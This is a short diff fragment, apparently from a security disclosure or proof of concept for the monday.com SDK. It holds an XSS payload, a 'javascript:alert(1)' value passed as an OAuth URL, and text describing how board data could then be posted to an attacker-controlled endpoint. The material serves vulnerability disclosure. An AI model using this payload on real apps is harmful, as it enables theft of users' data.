@@ -12,7 +12,7 @@
         document.body.appendChild(element);
       });
     monday.listen("events", (response) => console.log(response));
-    monday.execute('oauth', { mondayOauthUrl: 'javascript:alert(1)'})
+    monday.oauth({ mondayOauthUrl: 'javascript:alert(1)'})
   </script>
   Get all boards data.
   After fetching data it can be sent to attacker using POST request to any attacker controlled endpoint:
